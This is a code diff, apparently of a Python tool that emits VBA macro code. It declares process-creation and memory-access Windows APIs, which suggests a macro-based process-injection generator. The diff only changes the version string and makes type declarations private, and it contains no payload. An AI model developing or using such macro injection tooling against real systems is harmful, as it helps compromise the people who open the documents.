@@ -23,7 +23,7 @@ from termcolor import colored
 # You can modify binary-paths.txt to have a list of your own choice :)
 #
  
-version = "0.3 BETA"
+version = "0.31 BETA"
 
 def printBanner():
 
@@ -166,13 +166,13 @@ lines1 = ["Private Const PROCESS_ALL_ACCESS = &H1F0FFF\r\n",
 "Private Const PAGE_READWRITE = &H40\r\n",
 "Private Const HKEY_LOCAL_MACHINE = &H80000002\r\n",
 "Private Const PROCESSOR_ARCHITECTURE_AMD64 = 9\r\n",
-"Type PROCESS_INFORMATION\r\n",
+"Private Type PROCESS_INFORMATION\r\n",
 "hProcess As Long\r\n",
 "hThread As Long\r\n",
 "dwProcessId As Long\r\n",
 "dwThreadId As Long\r\n",
 "End Type\r\n",
-"Type STARTUPINFO\r\n",
+"Private Type STARTUPINFO\r\n",
 "cb As Long\r\n",
 "lpReserved As String\r\n",
 "lpDesktop As String\r\n",
@@ -202,7 +202,7 @@ lines1 = ["Private Const PROCESS_ALL_ACCESS = &H1F0FFF\r\n",
 "Private Declare PtrSafe Function GetCurrentProcess Lib \"kernel32\" () As LongPtr\r\n",
 "Private Declare PtrSafe Function IsWow64Process Lib \"kernel32\" (ByVal hProcess As LongPtr, ByRef Wow64Process As Boolean) As Boolean\r\n",
 "Private Declare PtrSafe Function CreateProcessA Lib \"kernel32\" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, ByVal lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long\r\n",
-"Type SYSTEM_INFO\r\n",
+"Private Type SYSTEM_INFO\r\n",
 "wProcessorArchitecture As Integer\r\n",
 "wReserved As Integer\r\n",
 "dwPageSize As Long\r\n",
@@ -225,7 +225,7 @@ lines1 = ["Private Const PROCESS_ALL_ACCESS = &H1F0FFF\r\n",
 "Private Declare Function GetCurrentProcess Lib \"kernel32\" () As Long\r\n",
 "Private Declare Function IsWow64Process Lib \"kernel32\" (ByVal hProcess As Long, ByRef Wow64Process As Boolean) As Boolean\r\n",
 "Private Declare Function CreateProcessA Lib \"kernel32\" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long\r\n"
-"Type SYSTEM_INFO\r\n",
+"Private Type SYSTEM_INFO\r\n",
 "wProcessorArchitecture As Integer\r\n",
 "wReserved As Integer\r\n",
 "dwPageSize As Long\r\n",
